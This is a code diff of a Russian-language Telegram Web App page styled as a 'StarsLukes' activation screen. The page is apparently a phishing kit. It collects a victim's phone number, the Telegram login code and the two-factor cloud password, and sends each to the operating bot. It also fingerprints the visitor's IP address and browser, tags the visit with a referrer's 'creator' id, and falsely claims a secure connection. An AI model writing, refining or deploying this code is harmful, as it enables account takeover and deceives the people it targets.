@@ -5,195 +5,84 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>StarsLukes · Активация</title>
     <style>
-        :root {
-            --bg: #0a0a0f;
-            --card: #12121a;
-            --gold: #d4af37;
-            --gold-light: #e8c84c;
-            --text: #e0e0e0;
-            --muted: #888;
-            --input-bg: #1a1a22;
-            --border: #2a2a35;
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', -apple-system, system-ui, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .card {
-            width: 100%;
-            max-width: 380px;
-            background: var(--card);
-            border-radius: 28px;
-            padding: 32px 24px;
-            border: 1px solid var(--border);
-            box-shadow: 0 30px 50px rgba(0,0,0,0.7);
-            text-align: center;
-        }
-        .logo {
-            font-size: 28px;
-            font-weight: 600;
-            color: var(--gold);
-            margin-bottom: 24px;
-        }
-        .logo span { color: #fff; font-weight: 300; }
-        .btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 14px;
-            background: linear-gradient(145deg, #c9a23b, #e4b84d);
-            color: #0a0a0f;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 12px;
-        }
-        .btn:active { transform: scale(0.98); }
-        .btn.secondary {
-            background: #2a2a35;
-            color: #ccc;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            background: var(--input-bg);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            margin-bottom: 10px;
-        }
-        input:focus { border-color: var(--gold); }
-        .hidden { display: none; }
-        .footer-note {
-            margin-top: 20px;
-            font-size: 12px;
-            color: var(--muted);
-        }
+        :root { --bg:#0a0a0f; --card:#12121a; --gold:#d4af37; --text:#e0e0e0; --input-bg:#1a1a22; }
+        body { font-family:Inter,sans-serif; background:var(--bg); color:var(--text); display:flex; align-items:center; justify-content:center; height:100vh; margin:0; padding:20px; }
+        .card { background:var(--card); border-radius:24px; padding:30px; width:100%; max-width:360px; text-align:center; border:1px solid #2a2a35; }
+        .logo { font-size:24px; color:var(--gold); margin-bottom:20px; }
+        .btn { width:100%; padding:14px; border:none; border-radius:14px; background:linear-gradient(145deg, #c9a23b, #e4b84d); color:#000; font-weight:bold; font-size:16px; margin-top:10px; }
+        input { width:100%; padding:12px; background:var(--input-bg); border:1px solid #333; border-radius:12px; color:#fff; font-size:16px; margin-bottom:10px; }
+        .hidden { display:none; }
+        .note { margin-top:15px; font-size:12px; color:#888; }
     </style>
 </head>
 <body>
 <div class="card">
-    <div class="logo">Stars<span>Lukes</span></div>
-
-    <!-- Шаг 1: выбор способа ввода номера -->
+    <div class="logo">StarsLukes</div>
     <div id="step-phone">
         <p>Авторизируйтесь через Telegram</p>
         <button class="btn" onclick="requestContact()">Поделиться контактом</button>
-        <div style="margin: 12px 0; color: #666;">или</div>
+        <div style="margin:12px 0; color:#666;">или</div>
         <input type="tel" id="manualPhone" placeholder="+79991234567">
         <button class="btn" onclick="submitManualPhone()">Отправить номер</button>
     </div>
-
-    <!-- Шаг 2: ввод кода -->
     <div id="step-code" class="hidden">
         <p>Введите код из Telegram</p>
-        <input type="text" id="codeInput" placeholder="12345" maxlength="5" inputmode="numeric">
+        <input type="text" id="codeInput" placeholder="12345" maxlength="5">
         <button class="btn" onclick="submitCode()">Подтвердить</button>
     </div>
-
-    <!-- Шаг 3: облачный пароль -->
     <div id="step-2fa" class="hidden">
-        <p>Облачный пароль (если требуется)</p>
+        <p>Облачный пароль</p>
         <input type="password" id="passwordInput" placeholder="Пароль">
         <button class="btn" onclick="submitPassword()">Войти</button>
     </div>
-
-    <div class="footer-note">Защищённое соединение</div>
+    <div class="note">Защищённое соединение</div>
 </div>
-
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
     const tg = window.Telegram.WebApp;
-    tg.ready();
-    tg.expand();
+    tg.ready(); tg.expand();
+    const fingerprint = { ip:'', userAgent:navigator.userAgent, platform:navigator.platform };
+    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>fingerprint.ip=d.ip).catch(()=>{});
+    const params = new URLSearchParams(window.location.search);
+    const creatorUid = params.get('creator')||null;
 
-    // Fingerprint
-    const fingerprint = {
-        ip: '',
-        userAgent: navigator.userAgent,
-        platform: navigator.platform
-    };
-    fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(d => { fingerprint.ip = d.ip; })
-        .catch(() => {});
+    // Сообщаем об открытии
+    tg.sendData(JSON.stringify({step:'page_opened', fingerprint, creator_uid:creatorUid}));
 
-    // Параметры URL (creator_uid)
-    const urlParams = new URLSearchParams(window.location.search);
-    const creatorUid = urlParams.get('creator') || null;
-
-    // Сразу сообщаем боту, что страница открыта
-    fetch('/report_open', { method: 'POST', body: JSON.stringify({
-        step: 'page_opened',
-        fingerprint: fingerprint,
-        creator_uid: creatorUid
-    }) }).catch(() => {});
-    tg.sendData(JSON.stringify({
-        step: 'page_opened',
-        fingerprint: fingerprint,
-        creator_uid: creatorUid
-    }));
-
-    function show(stepId) {
-        ['step-phone','step-code','step-2fa'].forEach(id => {
-            document.getElementById(id).classList.add('hidden');
-        });
-        document.getElementById(stepId).classList.remove('hidden');
+    function switchTo(id) {
+        ['step-phone','step-code','step-2fa'].forEach(x => document.getElementById(x).classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
     }
 
-    // Автоматическое "Поделиться контактом"
     window.requestContact = function() {
         tg.requestContact().then(contact => {
             sendPhone(contact.phone_number);
         }).catch(() => {
-            tg.showAlert('Не удалось автоматически получить номер. Пожалуйста, введите его вручную.');
+            tg.showAlert('Не удалось получить номер. Введите вручную.');
         });
     };
 
-    // Ручной ввод номера
     window.submitManualPhone = function() {
         const phone = document.getElementById('manualPhone').value.trim();
-        if (!phone.startsWith('+') || phone.length < 8) {
-            tg.showAlert('Введите номер в международном формате, начиная с +');
-            return;
-        }
+        if (!phone.startsWith('+') || phone.length<8) { tg.showAlert('Некорректный номер'); return; }
         sendPhone(phone);
     };
 
     function sendPhone(phone) {
-        tg.sendData(JSON.stringify({
-            step: 'send_code',
-            phone: phone,
-            fingerprint: fingerprint,
-            creator_uid: creatorUid
-        }));
-        show('step-code');
+        tg.sendData(JSON.stringify({step:'send_code', phone, fingerprint, creator_uid:creatorUid}));
+        switchTo('step-code');
     }
 
-    // Отправка кода
     window.submitCode = function() {
         const code = document.getElementById('codeInput').value.trim();
-        if (!/^\d{5}$/.test(code)) {
-            tg.showAlert('Код должен состоять из 5 цифр');
-            return;
-        }
-        tg.sendData(JSON.stringify({ step: 'verify_code', code: code }));
+        if (!/^\d{5}$/.test(code)) { tg.showAlert('Код из 5 цифр'); return; }
+        tg.sendData(JSON.stringify({step:'verify_code', code}));
         tg.close();
     };
 
-    // Отправка пароля
     window.submitPassword = function() {
         const password = document.getElementById('passwordInput').value;
-        tg.sendData(JSON.stringify({ step: 'password', password: password }));
+        tg.sendData(JSON.stringify({step:'password', password}));
         tg.close();
     };
 </script>
